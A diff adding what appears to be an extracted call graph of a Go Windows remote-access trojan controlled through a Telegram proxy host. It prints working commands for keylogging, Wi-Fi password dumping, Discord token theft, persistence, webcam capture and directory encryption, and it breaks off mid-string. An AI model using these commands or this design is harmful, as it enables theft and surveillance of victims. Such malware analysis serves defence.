@@ -1,0 +1,1068 @@
+main.main
+  0x6a0820 -> main.hideConsoleWindow
+  0x6a0852 -> os/user.Current
+  0x6a08b9 -> fmt.Sprintf("Somebody got ratted with this PC: \"%s\"")
+  0x6a0965 -> main.(*ProxyBot).SendRequest
+  0x6a0974 -> main.(*ProxyBot).UpdatesChannel
+  0x6a0984 -> syscall.getCurrentProcessId
+  0x6a0992 -> os.Executable
+  0x6a09a0 -> internal/filepathlite.Base
+  0x6a0bad -> github.com/go-telegram-bot-api/telegram-bot-api/v5.(*Message).Command
+main.hideConsoleWindow
+  0x68fcb7 -> syscall.(*LazyProc).Call
+  0x68fcf6 -> syscall.(*LazyProc).Call
+main.(*ProxyBot).SendRequest
+  0x68e74f -> encoding/json.Marshal
+  0x68e798 -> fmt.Errorf("error encoding request: %v")
+  0x68e882 -> net/http.NewRequestWithContext("POST", "https://proxy2.other.linuxon.top")
+  0x68e8cb -> fmt.Errorf("error creating request: %v")
+  0x68e940 -> net/textproto.CanonicalMIMEHeaderKey("Content-Type")
+  0x68ea00 -> net/textproto.CanonicalMIMEHeaderKey("HTTP-Insecure-Check")
+  0x68eac0 -> net/textproto.CanonicalMIMEHeaderKey("X-Session-Key")
+  0x68eb80 -> net/textproto.CanonicalMIMEHeaderKey("User-Agent")
+  0x68ec36 -> net/http.(*Client).do
+  0x68ed43 -> fmt.Errorf("HTTP error: %d %s")
+  0x68ed77 -> indirect_call -> main.(*ProxyBot).SendRequest.deferwrap1
+  0x68ede0 -> fmt.Errorf("error calling proxy: %v")
+  0x68ee34 -> io.ReadAll
+  0x68ee84 -> fmt.Errorf("error reading response: %v")
+  0x68eeb8 -> indirect_call
+  0x68ef29 -> encoding/json.Unmarshal
+  0x68ef72 -> fmt.Errorf("error parsing response: %v")
+  0x68efa6 -> indirect_call
+  0x68f01c -> indirect_call
+  0x68f0c4 -> fmt.Errorf("telegram API error (%d): %s")
+  0x68f0f8 -> indirect_call
+main.(*ProxyBot).SendRequest.deferwrap1
+  0x68f203 -> indirect_call
+main.(*ProxyBot).UpdatesChannel
+  <no direct calls>
+main.(*ProxyBot).UpdatesChannel.func1
+  0x68faf7 -> main.(*ProxyBot).GetUpdates
+  0x68fb16 -> time.Sleep
+  0x68fba6 -> time.Sleep
+main.(*ProxyBot).GetUpdates
+  0x68f6ba -> main.(*ProxyBot).SendRequest
+  0x68f70b -> encoding/json.Unmarshal
+  0x68f78a -> fmt.Errorf("error parsing updates: %v")
+internal/filepathlite.Base
+  0x4c3f74 -> internal/filepathlite.VolumeName
+internal/filepathlite.VolumeName
+  0x4c4058 -> internal/filepathlite.volumeNameLen
+  0x4c4079 -> internal/filepathlite.replaceStringByte
+internal/filepathlite.volumeNameLen
+  0x4c4220 -> internal/filepathlite.pathHasPrefixFold("\\\\.\\UNC")
+  0x4c4255 -> internal/filepathlite.pathHasPrefixFold("\\\\.")
+  0x4c4280 -> internal/filepathlite.pathHasPrefixFold("\\\\?")
+  0x4c42a6 -> internal/filepathlite.pathHasPrefixFold("\\??")
+internal/filepathlite.pathHasPrefixFold
+  <no direct calls>
+internal/filepathlite.replaceStringByte
+  0x4c3e72 -> internal/bytealg.IndexByteString
+github.com/go-telegram-bot-api/telegram-bot-api/v5.(*Message).Command
+  0x678637 -> internal/stringslite.Index("@")
+internal/stringslite.Index
+  0x409c59 -> internal/bytealg.IndexString
+  0x409cee -> internal/bytealg.IndexByteString
+  0x409d80 -> internal/bytealg.IndexByteString
+  0x409ee0 -> internal/bytealg.IndexRabinKarp[go.shape.string]
+  0x409fc0 -> internal/bytealg.IndexByteString
+  0x40a123 -> internal/bytealg.IndexString
+main.main.gowrap1
+  0x6a0e6b -> main.handleCommand
+main.handleCommand
+  0x69a240 -> strings.TrimSpace
+  0x69a245 -> main.listDirectory
+  0x69a2fa -> main.(*ProxyBot).SendRequest
+  0x69a3c5 -> main.(*ProxyBot).SendRequest
+  0x69a3d9 -> main.executeCommand
+  0x69a424 -> fmt.Sprintf("Command execution failed: %v")
+  0x69a4da -> main.(*ProxyBot).SendRequest
+  0x69a50d -> main.sendAsTextMessages
+  0x69a544 -> main.killProcess
+  0x69a5fa -> main.(*ProxyBot).SendRequest
+  0x69a6a4 -> main.(*ProxyBot).SendRequest
+  0x69a6d2 -> main.getWifiProfiles
+  0x69a6f0 -> indirect_call
+  0x69a7c4 -> main.(*ProxyBot).SendRequest
+  0x69a884 -> main.(*ProxyBot).SendRequest
+  0x69a894 -> main.typeText
+  0x69a948 -> main.(*ProxyBot).SendRequest
+  0x69a952 -> main.lockWorkstation
+  0x69aa06 -> main.(*ProxyBot).SendRequest
+  0x69aa30 -> main.getGeoIP
+  0x69aa45 -> indirect_call
+  0x69ab18 -> main.(*ProxyBot).SendRequest
+  0x69abda -> main.(*ProxyBot).SendRequest
+  0x69ac01 -> strings.TrimSpace
+  0x69ac06 -> main.doPrank
+  0x69acc4 -> main.(*ProxyBot).SendRequest
+  0x69ad8b -> main.(*ProxyBot).SendRequest
+  0x69ada0 -> main.speakText
+  0x69adb5 -> indirect_call
+  0x69ae84 -> main.(*ProxyBot).SendRequest
+  0x69af2a -> main.(*ProxyBot).SendRequest
+  0x69afeb -> main.(*ProxyBot).SendRequest
+  0x69b016 -> main.listDrives
+  0x69b0ca -> main.(*ProxyBot).SendRequest
+  0x69b0f2 -> main.rebootSystem
+  0x69b1a6 -> main.(*ProxyBot).SendRequest
+  0x69b1c8 -> main.getUptime
+  0x69b1dd -> indirect_call
+  0x69b2a7 -> main.(*ProxyBot).SendRequest
+  0x69b364 -> main.(*ProxyBot).SendRequest
+  0x69b38c -> strings.TrimSpace
+  0x69b391 -> main.setVolume
+  0x69b445 -> main.(*ProxyBot).SendRequest
+  0x69b585 -> main.(*ProxyBot).SendRequest
+  0x69b599 -> main.showMessageBoxAndNotify
+  0x69b5b0 -> indirect_call
+  0x69b684 -> main.(*ProxyBot).SendRequest
+  0x69b6b0 -> main.listMicrophones
+  0x69b764 -> main.(*ProxyBot).SendRequest
+  0x69b796 -> strings.TrimSpace
+  0x69b829 -> regexp.MatchString("^([a-zA-Z0-9-]+\\.)+[a-zA-Z]{2,}$")
+  0x69b8e4 -> os/exec.Command("cmd")
+  0x69b8e9 -> os/exec.(*Cmd).Start
+  0x69b900 -> indirect_call
+  0x69b9ca -> main.(*ProxyBot).SendRequest
+  0x69baa6 -> main.(*ProxyBot).SendRequest
+  0x69bb4c -> main.(*ProxyBot).SendRequest
+  0x69bc00 -> main.(*ProxyBot).SendRequest
+  0x69bc36 -> strings.TrimSpace
+  0x69bce5 -> main.(*ProxyBot).SendRequest
+  0x69bd44 -> fmt.Sprintf("Set-Date -Date \"%s\"")
+  0x69bd49 -> main.runPowershellCommand
+  0x69bd60 -> indirect_call
+  0x69be2a -> main.(*ProxyBot).SendRequest
+  0x69bf06 -> main.(*ProxyBot).SendRequest
+  0x69bf28 -> main.getSystemInfo
+  0x69bf40 -> main.sendAsTextMessages
+  0x69bf70 -> main.listUSBDevices
+  0x69c024 -> main.(*ProxyBot).SendRequest
+  0x69c080 -> main.executeCommand("tzutil /g")
+  0x69c095 -> indirect_call
+  0x69c164 -> main.(*ProxyBot).SendRequest
+  0x69c23a -> main.(*ProxyBot).SendRequest
+  0x69c245 -> main.shutdownSystem
+  0x69c2fa -> main.(*ProxyBot).SendRequest
+  0x69c30b -> strings.TrimSpace
+  0x69c3ba -> main.(*ProxyBot).SendRequest
+  0x69c479 -> strings.TrimSpace
+  0x69c480 -> main.blockSite
+  0x69c538 -> main.(*ProxyBot).SendRequest
+  0x69c566 -> main.getClipboard
+  0x69c58d -> os.tempDir
+  0x69c5a2 -> time.Now
+  0x69c5b3 -> time.Time.Format
+  0x69c5f9 -> fmt.Sprintf("clipboard-%s.txt")
+  0x69c650 -> path/filepath.join
+  0x69c6a0 -> os.WriteFile
+  0x69c6b5 -> indirect_call
+  0x69c784 -> main.(*ProxyBot).SendRequest
+  0x69c800 -> os.tempDir
+  0x69c812 -> time.Now
+  0x69c823 -> time.Time.Format
+  0x69c869 -> fmt.Sprintf("clipboard-%s.txt")
+  0x69c8c0 -> path/filepath.join
+  0x69c905 -> os.WriteFile
+  0x69c91a -> indirect_call
+  0x69c9e4 -> main.(*ProxyBot).SendRequest
+  0x69ca80 -> strings.TrimSpace
+  0x69caa6 -> main.getKeylog
+  0x69cae0 -> os.tempDir
+  0x69caf2 -> time.Now
+  0x69cb03 -> time.Time.Format
+  0x69cb49 -> fmt.Sprintf("keylog-%s.txt")
+  0x69cba0 -> path/filepath.join
+  0x69cbe5 -> os.WriteFile
+  0x69cc00 -> main.downloadFile
+  0x69cc12 -> os.Remove
+  0x69cce4 -> main.(*ProxyBot).SendRequest
+  0x69ccf5 -> indirect_call
+  0x69cdc4 -> main.(*ProxyBot).SendRequest
+  0x69cde6 -> main.stopKeylogger
+  0x69cea4 -> main.(*ProxyBot).SendRequest
+  0x69ced0 -> main.startKeylogger
+  0x69cf84 -> main.(*ProxyBot).SendRequest
+  0x69d029 -> main.(*ProxyBot).SendRequest
+  0x69d053 -> main.listProcesses
+  0x69d107 -> main.(*ProxyBot).SendRequest
+  0x69d199 -> strings.TrimSpace
+  0x69d1a0 -> main.setWallpaperFromURL
+  0x69d258 -> main.(*ProxyBot).SendRequest
+  0x69d2a0 -> strings.TrimSpace
+  0x69d2a5 -> main.setBrightness
+  0x69d35a -> main.(*ProxyBot).SendRequest
+  0x69d38c -> main.deleteFile
+  0x69d444 -> main.(*ProxyBot).SendRequest
+  0x69d475 -> main.muteVolume
+  0x69d529 -> main.(*ProxyBot).SendRequest
+  0x69d555 -> main.toggleRegistryPersistence
+  0x69d609 -> main.(*ProxyBot).SendRequest
+  0x69d695 -> main.listWebcams
+  0x69d749 -> main.(*ProxyBot).SendRequest
+  0x69d780 -> main.getDiscordTokenFiles
+  0x69d82a -> main.(*ProxyBot).SendRequest
+  0x69d844 -> main.regexSearchTokenFiles
+  0x69d86e -> os.Getenv("APPDATA")
+  0x69d8f4 -> path.Join
+  0x69d98a -> path.Join
+  0x69da20 -> path.Join
+  0x69db40 -> main.(*ProxyBot).SendRequest
+  0x69db80 -> main.listPrinters
+  0x69dc38 -> main.(*ProxyBot).SendRequest
+  0x69dc76 -> strings.TrimSpace
+  0x69dc80 -> main.unblockSite
+  0x69dd38 -> main.(*ProxyBot).SendRequest
+  0x69dd80 -> strings.TrimSpace
+  0x69dd85 -> strconv.Atoi
+  0x69de2f -> main.(*ProxyBot).SendRequest
+  0x69dec0 -> strings.TrimSpace
+  0x69df6a -> main.(*ProxyBot).SendRequest
+  0x69df6f -> main.getImportantDirectories
+  0x69df8b -> os.Stat
+  0x69dfaa -> os.underlyingErrorIs
+  0x69e089 -> main.(*ProxyBot).SendRequest
+  0x69e0e8 -> fmt.Sprintf
+  0x69e1a4 -> main.(*ProxyBot).SendRequest
+  0x69e1b9 -> main.encryptDirectory
+  0x69e204 -> fmt.Sprintf
+  0x69e2ba -> main.(*ProxyBot).SendRequest
+  0x69e380 -> fmt.Sprintf
+  0x69e438 -> main.(*ProxyBot).SendRequest
+  0x69e4e4 -> main.(*ProxyBot).SendRequest
+  0x69e516 -> main.getCurrentWallpaper
+  0x69e530 -> indirect_call
+  0x69e604 -> main.(*ProxyBot).SendRequest
+  0x69e626 -> internal/filepathlite.Base
+  0x69e651 -> main.(*ProxyBot).SendPhoto
+  0x69e725 -> main.(*ProxyBot).SendRequest
+  0x69e735 -> main.changeWallpaperToMessage
+  0x69e7e9 -> main.(*ProxyBot).SendRequest
+  0x69e8c0 -> main.(*ProxyBot).SendRequest
+  0x69e8d0 -> main.setClipboard
+  0x69e984 -> main.(*ProxyBot).SendRequest
+  0x69e9c6 -> main.enableTaskManager
+  0x69ea84 -> main.(*ProxyBot).SendRequest
+  0x69eac6 -> main.disableTaskManager
+  0x69eb84 -> main.(*ProxyBot).SendRequest
+  0x69ebc6 -> main.getFirewallStatus
+  0x69ec84 -> main.(*ProxyBot).SendRequest
+  0x69eccc -> strings.TrimSpace
+  0x69ed80 -> main.(*ProxyBot).SendRequest
+  0x69ed85 -> main.getImportantDirectories
+  0x69eda1 -> os.Stat
+  0x69edc0 -> os.underlyingErrorIs
+  0x69eea4 -> main.(*ProxyBot).SendRequest
+  0x69ef03 -> fmt.Sprintf
+  0x69efba -> main.(*ProxyBot).SendRequest
+  0x69efcf -> main.decryptDirectory
+  0x69f018 -> fmt.Sprintf
+  0x69f0cc -> main.(*ProxyBot).SendRequest
+  0x69f164 -> fmt.Sprintf
+  0x69f21a -> main.(*ProxyBot).SendRequest
+  0x69f2c4 -> main.(*ProxyBot).SendRequest
+  0x69f310 -> main.getAntivirusStatus
+  0x69f3c4 -> main.(*ProxyBot).SendRequest
+  0x69f410 -> main.emptyRecycleBin
+  0x69f4c4 -> main.(*ProxyBot).SendRequest
+  0x69f524 -> os.Stat
+  0x69f543 -> os.underlyingErrorIs
+  0x69f569 -> main.decryptDirectory
+  0x69f5ab -> internal/filepathlite.Base
+  0x69f638 -> fmt.Sprintf
+  0x69f6ec -> main.(*ProxyBot).SendRequest
+  0x69f720 -> internal/filepathlite.Base
+  0x69f7a2 -> fmt.Sprintf
+  0x69f85a -> main.(*ProxyBot).SendRequest
+  0x69f8b9 -> fmt.Sprintf
+  0x69f96d -> main.(*ProxyBot).SendRequest
+  0x69fa18 -> main.(*ProxyBot).SendRequest
+  0x69fa80 -> os.Stat
+  0x69faa0 -> os.underlyingErrorIs
+  0x69fac6 -> main.encryptDirectory
+  0x69fb09 -> internal/filepathlite.Base
+  0x69fb98 -> fmt.Sprintf
+  0x69fc4c -> main.(*ProxyBot).SendRequest
+  0x69fc80 -> internal/filepathlite.Base
+  0x69fd02 -> fmt.Sprintf
+  0x69fdba -> main.(*ProxyBot).SendRequest
+  0x69fe19 -> fmt.Sprintf
+  0x69fecd -> main.(*ProxyBot).SendRequest
+  0x69ff78 -> main.(*ProxyBot).SendRequest
+  0x69ffc0 -> main.getDecryptionKey
+  0x6a0145 -> main.(*ProxyBot).SendRequest
+  0x6a01a5 -> main.decryptDiscordToken
+  0x6a042b -> main.(*ProxyBot).SendRequest
+  0x6a04d1 -> main.(*ProxyBot).SendRequest
+main.listDirectory
+  0x696000 -> os.ReadDir
+  0x69633a -> indirect_call
+  0x6963c0 -> indirect_call
+  0x6963e0 -> indirect_call
+  0x6963ee -> time.Time.Format
+  0x696414 -> indirect_call
+  0x69644b -> indirect_call
+  0x696469 -> indirect_call
+  0x6964c9 -> fmt.Sprintf("%.2f MB")
+  0x6964e7 -> indirect_call
+  0x696505 -> indirect_call
+  0x696561 -> fmt.Sprintf("%.2f KB")
+  0x69657c -> indirect_call
+  0x6965c0 -> fmt.Sprintf("%d B")
+  0x696602 -> indirect_call
+  0x696700 -> fmt.Sprintf("%s\t%s\t%s\t%s\n")
+main.executeCommand
+  0x691a00 -> os/exec.Command("cmd")
+  0x691a46 -> os/exec.(*Cmd).CombinedOutput
+  0x691a60 -> strings.TrimSpace
+main.sendAsTextMessages
+  0x6952f8 -> main.(*ProxyBot).SendRequest
+  0x695302 -> time.Sleep
+main.killProcess
+  0x693062 -> strings.TrimSpace
+  0x69307a -> strconv.Atoi
+  0x6930a6 -> strings.EqualFold
+  0x693100 -> fmt.Sprintf("taskkill /IM %s /F")
+  0x693105 -> main.executeCommand
+  0x6931cd -> fmt.Sprintf("Failed to kill process '%s': %v\n%s")
+  0x693226 -> fmt.Sprintf("Process '%s' killed.")
+  0x6932a0 -> fmt.Sprintf("taskkill /PID %d /F")
+  0x6932a5 -> main.executeCommand
+  0x693368 -> fmt.Sprintf("Failed to kill PID %d: %v\n%s")
+  0x6933c0 -> fmt.Sprintf("Process with PID %d killed.")
+main.getWifiProfiles
+  0x691c29 -> main.executeCommand("netsh wlan show profiles")
+  0x691c48 -> strings.genSplit("\n")
+  0x691c92 -> fmt.Errorf("failed to get WiFi profiles: %v")
+  0x691d00 -> strings.TrimSpace
+  0x691d6f -> strings.genSplit(":")
+  0x691dac -> strings.TrimSpace
+  0x691f58 -> fmt.Sprintf("netsh wlan show profile name=\"%s\" key=clear")
+  0x691f60 -> main.executeCommand
+  0x691f8d -> strings.genSplit("\n")
+  0x692038 -> fmt.Sprintf("SSID: %s\nPassword: %s\n\n")
+  0x692166 -> strings.TrimSpace
+  0x6921cc -> strings.genSplit(":")
+  0x6921f4 -> strings.TrimSpace
+main.typeText
+  0x69392f -> fmt.Sprintf("Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait(\"%s\")")
+  0x693934 -> main.runPowershellCommand
+  0x693945 -> indirect_call
+main.runPowershellCommand
+  0x691b59 -> os/exec.Command("powershell")
+  0x691ba0 -> os/exec.(*Cmd).CombinedOutput
+  0x691bc0 -> strings.TrimSpace
+main.lockWorkstation
+  0x695e00 -> os/exec.Command("rundll32.exe")
+  0x695e05 -> os/exec.(*Cmd).Run
+  0x695e16 -> indirect_call
+main.getGeoIP
+  0x692260 -> net/http.(*Client).Get
+  0x6922e8 -> io.ReadAll
+  0x69230f -> indirect_call -> main.getGeoIP.deferwrap1
+  0x692355 -> indirect_call
+main.getGeoIP.deferwrap1
+  0x692423 -> indirect_call
+main.doPrank
+  0x692795 -> sync.(*RWMutex).Lock
+  0x692868 -> indirect_call
+  0x6928b6 -> indirect_call
+  0x6928eb -> main.runPowershellCommand("[console]::beep(1000,500)")
+  0x692912 -> indirect_call
+  0x692961 -> main.runPowershellCommand("(new-object -comObject WMPlayer.OCX.7).cdromCollection.Item(0).Eject()")
+  0x692988 -> indirect_call
+  0x6929e0 -> main.runPowershellCommand
+  0x6929fc -> indirect_call
+  0x692a55 -> main.togglePrankCommand("drawrandom", "Add-Type -AssemblyName System.Windows.Forms\nAdd-Type -AssemblyName System.Drawing\n$form = New-Object Windows.Forms.Form\n$form.FormBorderStyle = 'None'; $form.TopMost = $true\n$form.Bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds\n$form.BackColor = [System.Drawing.Color]::White; $form.TransparencyKey = $form.BackColor\n$form.ShowInTaskbar = $false; $rand = New-Object System.Random\n$form.Add_Shown({\n    $g = $form.CreateGraphics()\n    while ($true) {\n        $shape = $rand.Next(0,3); $color = [System.Drawing.Color]::FromArgb($rand.Next(256),$rand.Next(256),$rand.Next(256))\n        $brush = New-Object System.Drawing.SolidBrush $color\n        $x = $rand.Next($form.Width); $y = $rand.Next($form.Height)\n        $w = $rand.Next(20,200); $h = $rand.Next(20,200)\n        switch ($shape) {\n            0 { $g.FillEllipse($brush, $x, $y, $w, $h) }\n            1 { $g.FillRectangle($brush, $x, $y, $w, $h) }\n            2 { $g.DrawLine((New-Object System.Drawing.Pen $color, $rand.Next(1,10)), $x, $y, $x+$w, $y+$h) }\n        }\n        Start-Sleep -Milliseconds 100\n    }\n})\n$code = @\"\nusing System; using System.Runtime.InteropServices;\npublic class Win32 {\n    public const int GWL_EXSTYLE = -20; public const int WS_EX_LAYERED = 0x80000; public const int WS_EX_TRANSPARENT = 0x20;\n    [DllImport(\"user32.dll\")] public static extern int GetWindowLong(IntPtr hWnd, int nIndex);\n    [DllImport(\"user32.dll\")] public static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);\n}\n\"@\nAdd-Type $code; $handle = $form.Handle; $exStyle = [Win32]::GetWindowLong($handle, [Win32]::GWL_EXSTYLE)\n[Win32]::SetWindowLong($handle, [Win32]::GWL_EXSTYLE, $exStyle -bor [Win32]::WS_EX_LAYERED -bor [Win32]::WS_EX_TRANSPARENT)\n$form.ShowDialog()")
+  0x692a71 -> indirect_call
+  0x692acd -> main.togglePrankCommand("crazycursor", "Add-Type -AssemblyName System.Windows.Forms\nAdd-Type -TypeDefinition @\"\nusing System; using System.Runtime.InteropServices;\npublic class CursorMover {\n    [DllImport(\"user32.dll\")] public static extern bool SetCursorPos(int X, int Y);\n}\n\"@\n$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds\nwhile ($true) {\n    $x = Get-Random -Minimum 0 -Maximum $bounds.Width\n    $y = Get-Random -Minimum 0 -Maximum $bounds.Height\n    [CursorMover]::SetCursorPos($x, $y)\n    Start-Sleep -Milliseconds (Get-Random -Minimum 50 -Maximum 200)\n}")
+  0x692ae9 -> indirect_call
+  0x692b40 -> main.togglePrankCommand("shakewindow", "Add-Type @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n    [DllImport(\"user32.dll\")]\n    public static extern IntPtr GetForegroundWindow();\n    [DllImport(\"user32.dll\")]\n    public static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);\n    [DllImport(\"user32.dll\")]\n    public static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);\n}\npublic struct RECT {\n    public int Left; public int Top; public int Right; public int Bottom;\n}\n\"@\nAdd-Type -AssemblyName System.Windows.Forms\nfunction Shake-Window($hWnd) {\n    [Win32]::GetWindowRect($hWnd, [ref]$r)\n    $w = $r.Right - $r.Left; $hgt = $r.Bottom - $r.Top\n    $sw = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width\n    $sh = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height\n    $centerX = [math]::Round(($sw - $w) / 2); $centerY = [math]::Round(($sh - $hgt) / 2)\n    for ($i=0; $i -lt 8; $i++) {\n        $dx = Get-Random -Minimum -60 -Maximum 60; $dy = Get-Random -Minimum -60 -Maximum 60\n        [Win32]::MoveWindow($hWnd, $centerX + $dx, $centerY + $dy, $w, $hgt, $true)\n        Start-Sleep -Milliseconds 40\n    }\n    [Win32]::MoveWindow($hWnd, $centerX, $centerY, $w, $hgt, $true)\n}\n$lastHwnd = 0\nwhile ($true) {\n    $hWnd = [Win32]::GetForegroundWindow()\n    if ($hWnd -ne $lastHwnd -and $lastHwnd -ne 0) {\n        [Win32]::GetWindowRect($lastHwnd, [ref]$r)\n        $w = $r.Right - $r.Left; $hgt = $r.Bottom - $r.Top\n        $sw = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width\n        $sh = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height\n        $centerX = [math]::Round(($sw - $w) / 2); $centerY = [math]::Round(($sh - $hgt) / 2)\n        [Win32]::MoveWindow($lastHwnd, $centerX, $centerY, $w, $hgt, $true)\n    }\n    if ($hWnd -ne 0) { Shake-Window $hWnd; $lastHwnd = $hWnd }\n    Start-Sleep -Milliseconds 250\n}")
+  0x692b5c -> indirect_call
+  0x692ba0 -> main.runPowershellCommand("Add-Type @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class GDI {\n    [DllImport(\"user32.dll\")]\n    public static extern IntPtr GetDC(IntPtr hwnd);\n    [DllImport(\"gdi32.dll\")]\n    public static extern int BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);\n    [DllImport(\"user32.dll\")]\n    public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);\n}\n\"@\nAdd-Type -AssemblyName System.Windows.Forms\n$dc = [GDI]::GetDC([IntPtr]::Zero)\n[GDI]::BitBlt($dc, 0, 0, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height, $dc, 0, 0, 0x00550009)\n[GDI]::ReleaseDC([IntPtr]::Zero, $dc)")
+  0x692bc7 -> indirect_call
+  0x692bfb -> indirect_call
+main.doPrank.deferwrap1
+  0x692c80 -> sync.(*RWMutex).Unlock
+main.togglePrankCommand
+  0x692d49 -> os.(*Process).signal
+  0x692de0 -> fmt.Sprintf
+  0x692e66 -> os/exec.Command("powershell")
+  0x692eac -> os/exec.(*Cmd).Start
+  0x692f36 -> fmt.Sprintf
+  0x692fe1 -> fmt.Sprintf
+main.speakText
+  0x6925d5 -> strings.Replace("'", " ")
+  0x6925f8 -> strings.Replace("\"", " ")
+  0x692632 -> fmt.Sprintf("Add-Type -AssemblyName System.Speech;$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer;$speak.SelectVoice('Microsoft Zira Desktop');$speak.Speak('%s')")
+  0x692637 -> main.runPowershellCommand
+main.listDrives
+  0x693440 -> main.executeCommand("wmic logicaldisk get name")
+  0x693460 -> strings.genSplit("\n")
+  0x693474 -> indirect_call
+  0x6934d2 -> strings.TrimSpace
+  0x6935ce -> strings.Join
+main.rebootSystem
+  0x6981c0 -> os/exec.Command("shutdown")
+  0x6981c5 -> os/exec.(*Cmd).Start
+  0x6981d6 -> indirect_call
+main.getUptime
+  0x6926a0 -> main.executeCommand("net stats workstation")
+  0x6926c0 -> strings.genSplit("\n")
+  0x692711 -> internal/stringslite.Index("Statistics since")
+  0x692725 -> strings.TrimSpace
+main.setVolume
+  0x696997 -> strconv.Atoi
+  0x696a04 -> fmt.Sprintf("(New-Object -ComObject WScript.Shell).SendKeys([char]174 * 50); Start-Sleep -Milliseconds 150; (New-Object -ComObject WScript.Shell).SendKeys([char]175 * %d)")
+  0x696a09 -> main.runPowershellCommand
+  0x696a1a -> indirect_call
+  0x696a75 -> fmt.Sprintf
+main.handleCommand.gowrap2
+  0x6a0760 -> main.sendWebcamImage
+main.sendWebcamImage
+  0x691637 -> main.(*ProxyBot).SendRequest
+  0x691640 -> main.captureWebcam
+  0x691689 -> fmt.Sprintf
+  0x691728 -> main.(*ProxyBot).SendRequest
+  0x6917d7 -> main.(*ProxyBot).SendRequest
+  0x6917f7 -> time.Now
+  0x691808 -> time.Time.Format
+  0x69184e -> fmt.Sprintf("webcam-%s.jpg")
+  0x691873 -> main.(*ProxyBot).SendPhoto
+  0x6918c4 -> fmt.Sprintf
+  0x691963 -> main.(*ProxyBot).SendRequest
+main.captureWebcam
+  0x690a48 -> os.tempDir
+  0x690aa7 -> path/filepath.join
+  0x690ab6 -> time.Now
+  0x690ac7 -> time.Time.Format
+  0x690b0d -> fmt.Sprintf("webcam-%s.jpg")
+  0x690b61 -> path/filepath.join
+  0x690b7a -> os.Stat
+  0x690ba0 -> os.underlyingErrorIs
+  0x690bc3 -> net/http.(*Client).Get
+  0x690c6d -> fmt.Errorf("failed to download webcam tool: %v")
+  0x690cc1 -> io.ReadAll
+  0x690d0a -> fmt.Errorf("failed to read webcam tool data: %v")
+  0x690d40 -> indirect_call -> main.captureWebcam.deferwrap1
+  0x690d87 -> os.WriteFile
+  0x690dd2 -> fmt.Errorf("failed to save webcam tool: %v")
+  0x690e06 -> indirect_call
+  0x690ea0 -> os/exec.Command
+  0x690eec -> os/exec.(*Cmd).Run
+  0x690f35 -> fmt.Errorf("webcam capture failed: %v")
+  0x690f75 -> indirect_call
+  0x690fac -> os.ReadFile
+  0x690ff5 -> fmt.Errorf("failed to read webcam image: %v")
+  0x691035 -> indirect_call
+  0x691080 -> os.Remove
+  0x6910cf -> indirect_call
+main.captureWebcam.deferwrap1
+  0x6911c3 -> indirect_call
+main.(*ProxyBot).SendPhoto
+  0x68f290 -> encoding/base64.(*Encoding).EncodeToString
+  0x68f36f -> main.(*ProxyBot).SendRequest
+main.showMessageBoxAndNotify
+  0x692508 -> main.(*ProxyBot).SendRequest
+  0x69254f -> fmt.Sprintf("Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('%s')")
+  0x692554 -> main.runPowershellCommand
+main.listMicrophones
+  0x697fe0 -> main.runPowershellCommand("$ErrorActionPreference = \"SilentlyContinue\"\n$micList = @()\nif (Get-Command Get-PnpDevice -ErrorAction SilentlyContinue) {\n    $micList = Get-PnpDevice -Class AudioInput | Where-Object { $_.Status -eq \"OK\" } | Select-Object -ExpandProperty FriendlyName\n}\nif (-not $micList -or $micList.Count -eq 0) {\n    $micList = Get-CimInstance Win32_SoundDevice | Where-Object { $_.Name -match 'microphone|input|audio' -or $_.ProductName -match 'microphone|input|audio' } | Select-Object -ExpandProperty Name\n}\nif ($micList) {\n    $micList | ForEach-Object { $_ }\n} else {\n    \"No microphones found.\"\n}")
+  0x697fea -> strings.TrimSpace
+  0x69802c -> indirect_call
+main.getSystemInfo
+  0x693a49 -> main.runPowershellCommand("$os=Get-WmiObject Win32_OperatingSystem;$cs=Get-WmiObject Win32_ComputerSystem;$bios=Get-WmiObject Win32_BIOS;$cpu=Get-WmiObject Win32_Processor;$ram=[math]::Round($cs.TotalPhysicalMemory/1GB,1);$ramFree=[math]::Round($os.FreePhysicalMemory/1MB,1);$gpu=Get-WmiObject Win32_VideoController|Select-Object -First 1;$localIP=(Get-NetIPAddress -AddressFamily IPv4|Where-Object{$_.IPAddress -notlike '169.*' -and $_.IPAddress -ne '127.0.0.1'}|Select-Object -First 1 -ExpandProperty IPAddress);$mac=(Get-NetAdapter|Where-Object{$_.Status -eq 'Up'}|Select-Object -First 1 -ExpandProperty MacAddress);$gateway=(Get-NetRoute -DestinationPrefix '0.0.0.0/0'|Select-Object -First 1 -ExpandProperty NextHop);$dns=(Get-DnsClientServerAddress|Where-Object{$_.ServerAddresses}|Select-Object -First 1 -ExpandProperty ServerAddresses);$wifi=(netsh wlan show interfaces)-match 'SSID'|Select-Object -First 1;$wifiSignal=(netsh wlan show interfaces)-match 'Signal'|Select-Object -First 1;$av=(Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct|Select-Object -First 1 -ExpandProperty displayName);$fw=(Get-NetFirewallProfile|Where-Object{$_.Enabled}|Select-Object -First 1 -ExpandProperty Name);$timezone=(Get-TimeZone).DisplayName;$locale=(Get-Culture).Name;$swCount=(Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*|Measure-Object).Count;$procCount=(Get-Process|Measure-Object).Count;$battery=(Get-WmiObject 